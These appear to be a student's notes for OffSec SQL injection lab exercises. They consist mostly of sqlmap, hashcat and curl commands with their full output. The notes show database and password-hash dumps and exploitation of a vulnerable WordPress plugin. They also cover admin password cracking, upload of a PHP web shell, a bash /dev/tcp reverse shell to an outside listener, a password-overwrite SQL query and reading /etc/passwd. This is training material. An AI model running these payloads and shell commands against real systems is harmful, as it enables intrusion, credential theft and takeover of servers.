[08:31:26] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[08:31:26] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[08:31:47] [INFO] adjusting time delay to 1 second due to good response times
offsec
[08:32:28] [INFO] fetching tables for database: 'offsec'
[08:32:28] [INFO] fetching number of tables for database 'offsec'
[08:32:28] [INFO] retrieved: 2
[08:32:33] [INFO] retrieved: cu
[08:33:02] [ERROR] invalid character detected. retrying..
[08:33:02] [WARNING] increasing time delay to 2 seconds
stomers
[08:34:43] [INFO] retrieved: users
[08:35:53] [INFO] fetching columns for table 'users' in database 'offsec'
[08:35:53] [INFO] retrieved: 4
[08:35:59] [INFO] retrieved: id
[08:36:29] [INFO] retrieved: username
[08:38:12] [INFO] retrieved: password
[08:40:15] [INFO] retrieved: description
[08:42:55] [INFO] fetching entries for table 'users' in database 'offsec'
[08:42:55] [INFO] fetching number of entries for table 'users' in database 'offsec'
[08:42:55] [INFO] retrieved: 4
[08:43:01] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
this is the a
[08:46:46] [ERROR] invalid character detected. retrying..
[08:46:46] [WARNING] increasing time delay to 3 seconds
dmin
[08:48:06] [INFO] retrieved: 1
[08:48:21] [INFO] retrieved: 21232f297a57a5a743894a0e4a8
[09:00:21] [ERROR] invalid character detected. retrying..
[09:00:21] [WARNING] increasing time delay to 4 seconds
01f
[09:02:01] [ERROR] invalid character detected. retrying..
[09:02:01] [WARNING] increasing time delay to 5 seconds
c3
[09:02:55] [INFO] retrieved: admin
[09:05:38] [ERROR] invalid character detected. retrying..
[09:05:38] [WARNING] increasing time delay to 6 seconds

[09:05:39] [INFO] retrieved: tr
[09:07:59] [ERROR] invalid character detected. retrying..
[09:07:59] [WARNING] increasing time delay to 7 seconds
y harder
[09:13:54] [INFO] retrieved: 2
[09:14:39] [INFO] retrieved: f9664ea1803311b35f8
[09:29:16] [ERROR] invalid character detected. retrying..
[09:29:16] [WARNING] increasing time delay to 8 seconds
1d07d
[09:35:46] [ERROR] invalid character detected. retrying..
[09:35:46] [WARNING] increasing time delay to 9 seconds
8c9e072d
[09:45:43] [INFO] retrieved: offse
[09:51:18] [ERROR] invalid character detected. retrying..
[09:51:18] [WARNING] increasing time delay to 10 seconds
c
[09:52:00] [INFO] retrieved: OS{31c7e8bfd1b1
[10:08:16] [ERROR] invalid character detected. retrying..
[10:08:16] [WARNING] increasing time delay to 11 seconds
742d11d
[10:16:17] [ERROR] invalid character detected. retrying..
[10:16:17] [WARNING] increasing time delay to 12 seconds
6aee90b4d64f
[10:34:24] [ERROR] invalid character detected. retrying..
[10:34:24] [WARNING] increasing time delay to 13 seconds
5}
[10:38:50] [INFO] retrieved: 3
[10:40:10] [INFO] retrieved: 5f
[10:45:04] [ERROR] invalid character detected. retrying..
[10:45:04] [WARNING] increasing time delay to 14 seconds
4dc
[10:50:22] [ERROR] invalid character detected. retrying..
[10:50:22] [WARNING] increasing time delay to 15 seconds
c3b5
[10:59:01] [ERROR] invalid character detected. retrying..
[10:59:01] [WARNING] increasing time delay to 16 seconds
[11:00:36] [ERROR] invalid character detected. retrying..
[11:00:36] [WARNING] increasing time delay to 17 seconds
[11:02:17] [ERROR] invalid character detected. retrying..
[11:02:17] [WARNING] increasing time delay to 18 seconds
[11:04:05] [ERROR] invalid character detected. retrying..
[11:04:05] [WARNING] increasing time delay to 19 seconds
[11:05:58] [ERROR] invalid character detected. retrying..
[11:05:58] [WARNING] increasing time delay to 20 seconds
[11:07:58] [ERROR] unable to properly validate last character value ('l')..
la76
[11:08:34] [ERROR] invalid character detected. retrying..
[11:08:34] [WARNING] increasing time delay to 2 seconds
5
[11:09:09] [ERROR] invalid character detected. retrying..
[11:09:09] [WARNING] increasing time delay to 3 seconds
[11:09:42] [ERROR] invalid character detected. retrying..
[11:09:42] [WARNING] increasing time delay to 4 seconds
[11:10:30] [ERROR] invalid character detected. retrying..
[11:10:30] [WARNING] increasing time delay to 5 seconds
d6
[11:12:17] [ERROR] invalid character detected. retrying..
[11:12:17] [WARNING] increasing time delay to 6 seconds
1d8327deb882cf99
[11:23:02] [INFO] retrieved: bob
[11:25:55] [ERROR] invalid character detected. retrying..
[11:25:55] [WARNING] increasing time delay to 7 seconds
a
[11:26:12] [INFO] retrieved: pew pew
[11:33:16] [INFO] retrieved: 4
[11:34:15] [INFO] retrieved: 5653c6b1f51852a
[11:46:31] [ERROR] invalid character detected. retrying..
[11:46:31] [WARNING] increasing time delay to 8 seconds
6351
[11:51:18] [ERROR] invalid character detected. retrying..
[11:51:18] [WARNING] increasing time delay to 9 seconds
ec69c84
[12:00:23] [ERROR] invalid character detected. retrying..
[12:00:23] [WARNING] increasing time delay to 10 seconds
52abc6
[12:06:35] [INFO] retrieved: han
[12:10:03] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[12:12:06] [INFO] writing hashes to a temporary file '/tmp/sqlmap693di119196158/sqlmaphashes-v4ipb5cf.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: offsec
Table: users
[4 entries]
+----+----------------------------------+----------+--------------------------------------+
| id | password                         | username | description                          |
+----+----------------------------------+----------+--------------------------------------+
| 1  | 21232f297a57a5a743894a0e4a801fc3 | admin    | this is the admin                    |
| 2  | f9664ea1803311b35f81d07d8c9e072d | offsec   | try harder                           |
| 3  | 5f4dcc3b5la765d61d8327deb882cf99 | boba     | OS{31c7e8bfd1b1742d11d6aee90b4d64f5} |
| 4  | 5653c6b1f51852a6351ec69c8452abc6 | han      | pew pew                              |
+----+----------------------------------+----------+--------------------------------------+

[12:12:12] [INFO] table 'offsec.users' dumped to CSV file '/home/operator/.local/share/sqlmap/output/192.168.209.19/dump/offsec/users.csv'

```
- *This is an extremely time consuming and noisy process when dealing with time-base blind SQLi, but it is effective.*.
- Since this is a blind SQLi vuln, fetching the entire DB is slow.
 - Once complete we will have all of the users MD5 hashed creds!

- Sqlmap also offers the `--os-shell` param.
 - Provides interactive shell.

###### Capstone Excercises

Enumerate the Module Exercise - VM #1 and exploit the SQLi vulnerability in order to get the flag.
```
# IMPORTANT, MUST ADD SITE MENTIONED ON PAGE TO /ETC/HOSTS!!!!!!
192.168.209.47 alvida-eatery.org

sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms

--dbms=mysql = force DB type


URL,POST
http://alvida-eatery.org/?s=,
http://alvida-eatery.org/,EMAIL=&subscribe=&GDPR=1
http://alvida-eatery.org/?page_id=18,EMAIL=&subscribe=&GDPR=1
http://alvida-eatery.org/?p=77,EMAIL=&subscribe=&GDPR=1
http://alvida-eatery.org/wp-comments-post.php,comment=&author=&email=&url=&wp-comment-cookies-consent=yes&submit=Post+Comment&comment_post_ID=77&comment_parent=0
http://alvida-eatery.org/?m=201608,EMAIL=&subscribe=&GDPR=1
http://alvida-eatery.org/?paged=3,EMAIL=&subscribe=&GDPR=1
http://alvida-eatery.org/?cat=3,EMAIL=&subscribe=&GDPR=1
http://alvida-eatery.org/?feed=rss2,
http://alvida-eatery.org/index.php?rest_route=/,
http://alvida-eatery.org/?page_id=6,
http://alvida-eatery.org/?cat=2,
http://alvida-eatery.org/?p=122,
http://alvida-eatery.org/?paged=2,
http://alvida-eatery.org/?m=201608,
http://alvida-eatery.org/index.php?rest_route=/oembed/1.0/embed&url=http://alvida-eatery.org/%3Fpage_id%3D18,
http://alvida-eatery.org/?feed=rss2&p=77,
http://alvida-eatery.org/?tag=holidays,
http://alvida-eatery.org/?page_id=6&paged=2,
http://alvida-eatery.org/?feed=rss2&cat=3,
http://alvida-eatery.org/?cat=2&paged=2,


┌──(operator㉿labhost)-[~/sqlmap]
└─$ sqlmap -u "http://alvida-eatery.org/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --dbms=mysql


1. Included alvida-eatery.org in /etc/hosts
2. Ran wpscan --url http://alvida-eatery.org
3. Saw Perfect Survey plugin listed
4. Ran searchsploit perfect plugin
5. Ran searchsploit -m 50766
6. Called python3 50766 -U alvida-eatery.org -P 80 -T /
7. SQLmap execution failed.
8. Manually executed sqlmap -u http://alvida-eatery.org/wp-admin/admin-ajax.php --method POST --data "action=get_question&question_id=1 *" --all
9. Failed again. 
10. Tried to call the same url through Burpsuite and get this:

HTTP/1.1 404 Not Found
Date: Fri, 01 Sep 2023 23:15:07 GMT
Server: Apache/2.4.52 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Pragma: no-cache
Access-Control-Allow-Origin: http://alvida-eatery.org
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: SAMEORIGIN
Content-Length: 27
Connection: close
Content-Type: application/json; charset=UTF-8

{"question_id":0,"html":""}


1) Save the below into a file as wp.req

GET /wp-admin/admin-ajax.php?action=get_question&question_id=1* HTTP/1.1
Host: alvida-eatery.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

2) Run below command using sqlmap

sqlmap -r wp.req -p 'question_id' -D wordpress -T wp_users --dump --technique=T --flush-session

---

┌──(operator㉿labhost)-[~/sqlmap]
└─$ wpscan --url "alvida-eatery.org"

...
[+] perfect-survey
 | Location: http://alvida-eatery.org/wp-content/plugins/perfect-survey/
 | Latest Version: 1.5.1 (up to date)
 | Last Updated: 2021-06-11T12:09:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://alvida-eatery.org/wp-content/plugins/perfect-survey/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://alvida-eatery.org/wp-content/plugins/perfect-survey/readme.txt
...

┌──(operator㉿labhost)-[~/OffSec]
└─$ searchsploit perfect survey
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
WordPress Plugin Perfect Survey - 1.5.1 - SQLi (Unauth | php/webapps/50766.py
------------------------------------------------------- ---------------------------------
Shellcodes: No Results


┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ searchsploit -m 50766
  Exploit: WordPress Plugin Perfect Survey - 1.5.1 - SQLi (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50766
     Path: /usr/share/exploitdb/exploits/php/webapps/50766.py
    Codes: CVE-2021-24762
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/operator/OffSec/sqli/50766.py

#
#### Important Options!!!
#
┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ sqlmap -r wp.req -p 'question_id' -D wordpress -T wp_users --dump --technique=T --flush-session

...
[19:40:49] [WARNING] increasing time delay to 2 seconds
//al
[19:41:52] [ERROR] invalid character detected. retrying..
[19:41:52] [WARNING] increasing time delay to 3 seconds
vida-eatery.org
[19:45:59] [INFO] retrieved: 
[19:45:59] [INFO] recognized possible password hashes in column 'user_pass'

do you want to crack them via a dictionary-based attack? [Y/n/q] 
[19:57:40] [INFO] using hash method 'phpass_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/smalldict.txt' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> /usr/share/wordlists/fasttrack.txt
[19:59:48] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[19:59:57] [INFO] starting dictionary-based cracking (phpass_passwd)
[19:59:57] [INFO] starting 8 processes 
[20:00:06] [WARNING] no clear password(s) found                                                                                                                                                                                              
Database: wordpress
Table: wp_users
[1 entry]
+----+--------------------------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url                 | user_pass                          | user_email           | user_logmn | usgr_status | display_name | user_nicename | user_registered     | user_actmvation_key |
+----+--------------------------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | qttp://alvida-eatery.org | $P$BINYaLa8QLMqeXbQtzT2Qfizm2P/nI0 | admin@offsec-lab.com | <blank>    | <blank>     | admin        | admin         | 2022-06-06 13:51:36 | <blank>             |
+----+--------------------------+------------------------------------+----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

[20:00:06] [INFO] table 'wordpress.wp_users' dumped to CSV file '/home/operator/.local/share/sqlmap/output/alvida-eatery.org/dump/wordpress/wp_users.csv'
[20:00:06] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 2470 times
[20:00:06] [INFO] fetched data logged to text files under '/home/operator/.local/share/sqlmap/output/alvida-eatery.org'


---
http://alvida-eatery.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 * (GET)  # /usr/bin/sqlmap "http://alvida-eatery.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" -D wordpress -T wp_users --technique=T --flush-session --risk=3 --level=5 -v3 --dbms=MySQL --os=Linux --ignore-code=404 --batch --dump
---
http://alvida-eatery.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 * (GET)  # /usr/bin/sqlmap "http://alvida-eatery.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --technique=T --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --os-cmd="bash -i >& /dev/tcp/192.168.45.223/4444 0>&1" --ignore-code=404 --batch
---
http://alvida-eatery.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 * (GET)  # /usr/bin/sqlmap "http://alvida-eatery.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" -D wordpress -T wp_users --technique=T --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --sql-query="UPDATE wp_users SET user_pass = md5('new_password') WHERE ID = 1;" --ignore-code=404 --batch

┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ cat /home/operator/.local/share/sqlmap/output/alvida-eatery.org/log 
sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1  AND (SELECT 7767 FROM (SELECT(SLEEP(5)))lBnl)
---
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
current user: 'dbadmin@localhost'
available databases [3]:
[*] information_schema
[*] performance_schema
[*] wordpress

sqlmap resumed the following injection point(s) from stored session:
---

sqlmap "http://alvida-eatery.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" -D wordpress -T wp_users --technique=T --eta --dbms=MySQL --os=Linux --ignore-code=404 --batch --flush-session --sql-query="SELECT user_pass FROM wordpress.wp_users"

#
#### Phase 2
#

# The table schema of wp_users was retrieved in an earlier Blind SQLi attack, however incosistencies in connection caused errors in retrieving some values. Since I know the wp_user at ID = 1 is 'admin', I honed the attack in on their PHP Pass hash;
# --time-sec=3 and --no-cast may have helped (trial and error)
# A persistent 404 was ignored

┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ sqlmap -r wp.req -p 'question_id' -D wordpress -T wp_users --risk=1 --level=1 --technique=T  --ignore-code=404 --batch --time-sec=3 --sql-query="SELECT user_pass FROM wordpress.wp_users" --flush-session --no-cast

...
SELECT user_pass FROM wordpress.wp_users: '$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0'
[12:42:36] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 434 times
[12:42:36] [INFO] fetched data logged to text files under '/home/operator/.local/share/sqlmap/output/alvida-eatery.org'
...

# Prepared to run the retrieved PHP Pass hash through hashcat

echo '$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0' > md5.tt

┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ hashcat -a 0 -o out.txt -m 400 md5.txt /usr/share/wordlists/rockyou.txt 

┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ cat out.txt                                                                   
$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0:hulabaloo


# The ID = 1 user (admin) password is "hulabaloo"
# Logged into Wordpress as admin

# Go to Seclist Git and get a PHP web-shell

┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ zip web-shell.zip web-shell.php
  adding: web-shell.php (deflated 58%)

# Uploaded plugin (no need to activate)

┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ curl http://alvida-eatery.org/wp-content/plugins/web-shell/web-shell.php?cmd=whoami
www-data

┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ curl http://alvida-eatery.org/wp-content/plugins/web-shell/web-shell.php?cmd=pwd
/var/www/wordpress/wp-content/plugins/web-shell


# Web shell is working!  Upgrade to reverse shell...
# NOTE that we wrap the reverse shell in /bin/bash -c

┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ urlencode '/bin/bash -c "bash -i >& /dev/tcp/192.168.45.223/4444 0>&1"'
%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ curl http://alvida-eatery.org/wp-content/plugins/web-shell/web-shell.php?cmd=%2Fbin%2Fbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22

┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.212.47] 36902
bash: cannot set terminal process group (809): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Alvida:/var/www/wordpress/wp-content/plugins/web-shell$ ls
ls
web-shell.php
www-data@Alvida:/var/www/wordpress/wp-content/plugins/web-shell$ cd /var/www	
cd /var/www
www-data@Alvida:/var/www$ ls
ls
flag.txt
html
wordpress
www-data@Alvida:/var/www$ cat flag.txt	
cat flag.txt
OS{2edb78ffeaeba64232f91b2c8d03f383}
www-data@Alvida:/var/www$

# We found the flag.txt in /var/www/flag.txt

OS{2edb78ffeaeba64232f91b2c8d03f383}
```


Capstone Exercise: Enumerate the Module Exercise - VM #2 and exploit the SQLi vulnerability in order to get the flag.
```
┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ sudo nmap -sS -sV 192.168.212.48
[sudo] password for operator: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 14:21 PDT
Nmap scan report for 192.168.212.48
Host is up (0.080s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    nginx 1.14.2
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/subm
it/ .
Nmap done: 1 IP address (1 host up) scanned in 8.56 seconds


# Browsed page with Burp, noticed that the email subscribe entry might be interesting and is the only PHP on the site that POSTs
# Test with Burp Repeater

POST /index.php HTTP/1.1
Host: 192.168.212.48
Content-Length: 11
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.212.48
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.212.48/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

mail-list='

# Returns;

...
<script>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1  <!-- end subscribe section -->
...

# Save POST req to file and probe with sqlmap

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ sqlmap -r sub.req -p "mail-list" 
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:57:37 /2023-09-05/

[14:57:37] [INFO] parsing HTTP request from 'sub.req'
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] 
[14:57:39] [INFO] testing connection to the target URL
[14:57:39] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:57:39] [INFO] testing if the target URL content is stable
[14:57:39] [INFO] target URL content is stable
[14:57:39] [INFO] testing if (custom) POST parameter '#1*' is dynamic
[14:57:40] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
[14:57:40] [INFO] heuristic (basic) test shows that (custom) POST parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[14:57:40] [INFO] heuristic (XSS) test shows that (custom) POST parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
[14:57:40] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[14:58:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:58:02] [WARNING] reflective value(s) found and filtering out
[14:58:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:58:02] [INFO] testing 'Generic inline queries'
[14:58:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:58:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[14:58:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[14:58:12] [INFO] (custom) POST parameter '#1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="Free Html Templates")
[14:58:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:58:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[14:58:12] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[14:58:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[14:58:12] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[14:58:12] [INFO] (custom) POST parameter '#1*' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[14:58:12] [INFO] testing 'MySQL inline queries'
[14:58:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[14:58:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[14:58:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[14:58:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[14:58:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[14:58:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[14:58:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:58:24] [INFO] (custom) POST parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[14:58:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:58:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[14:58:24] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:58:24] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:58:24] [INFO] target URL appears to have 6 columns in query
[14:58:25] [INFO] (custom) POST parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[14:58:25] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 132 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: mail-list=' OR NOT 5672=5672#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: mail-list=' AND GTID_SUBSET(CONCAT(0x716a6a6b71,(SELECT (ELT(5414=5414,1))),0x717a717a71),5414)-- OKZt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: mail-list=' AND (SELECT 5635 FROM (SELECT(SLEEP(5)))Xrnt)-- MhbY

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: mail-list=' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716a6a6b71,0x6e47555a53725769654e4e776b594b6f596c7575506249675863476b735950757567614e66454177,0x717a717a71),NULL#
---
[14:59:30] [INFO] the back-end DBMS is MySQL
[14:59:30] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.6
[14:59:31] [INFO] fetched data logged to text files under '/home/operator/.local/share/sqlmap/output/192.168.212.48'

[*] ending @ 14:59:31 /2023-09-05/


# Hone in on the loot

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ sqlmap -r sub.req -p "mail-list" --dbms=MySQL -a --technique=EUSQ --batch  --exclude-sysdbs --flush-session


# Review loot

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ cat /home/operator/.local/share/sqlmap/output/192.168.212.48/log 
sqlmap identified the following injection point(s) with a total of 236 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: mail-list=' AND GTID_SUBSET(CONCAT(0x717a6b7171,(SELECT (ELT(4502=4502,1))),0x71716a7871),4502)-- TAhy

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: mail-list=' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x717a6b7171,0x5244726d44564644784468775455644747756b6c4c41686f77664d53504b614a4f50774e64514e63,0x71716a7871),NULL#
---
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.6
banner: '8.0.29'
current user: 'gollum@localhost'
current database: 'animal_planet'
hostname: 'animal-world'
current user is DBA: False
database management system users [1]:
[*] 'gollum'@'localhost'

database management system users privileges:
[*] 'gollum'@'localhost' [1]:
    privilege: FILE

database management system users roles:
[*] 'gollum'@'localhost' [1]:
    role: FILE

Database: animal_planet
Table: subscribers
[6 entries]
+----+------------------------+----------+----------+---------------------+------------+
| id | emails                 | status   | is_donor | created_at          | donor_type |
+----+------------------------+----------+----------+---------------------+------------+
| 1  | Owen@forestsave.lab    | active   | Yes      | 2022-06-08 18:41:20 | Yearly     |
| 2  | Bala@forestsave.lab    | active   | Yes      | 2022-06-08 18:41:32 | Yearly     |
| 3  | Dylan@forestsave.lab   | active   | Yes      | 2022-06-08 18:41:36 | Montly     |
| 4  | Kirikou@forestsave.lab | On-Hold  | Yes      | 2022-06-08 18:41:41 | Weekly     |
| 5  | Musi@forestsave.lab    | none     | No       | 2022-06-08 18:41:45 | none       |
| 6  | Adams@forestsave.lab   | none     | No       | 2022-06-08 18:41:50 | none       |
+----+------------------------+----------+----------+---------------------+------------+

   
# After reviewing the loot we found that the DB user has FILE permissions;
# FILE	File_priv	File access on server host
# https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html
#

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ sqlmap -r sub.req -p "mail-list" --dbms=MySQL --technique=EUSQ --batch --exclude-sysdbs --file-read=/etc/passwd

# Got more loot...

...
[15:29:14] [INFO] the local file '/home/operator/.local/share/sqlmap/output/192.168.212.48/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (1404 B)
files saved to [1]:
[*] /home/operator/.local/share/sqlmap/output/192.168.212.48/files/_etc_passwd (same file)

[15:29:14] [INFO] fetched data logged to text files under '/home/operator/.local/share/sqlmap/output/192.168.212.48'
...
                                                                                         
┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ cat /home/operator/.local/share/sqlmap/output/192.168.212.48/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
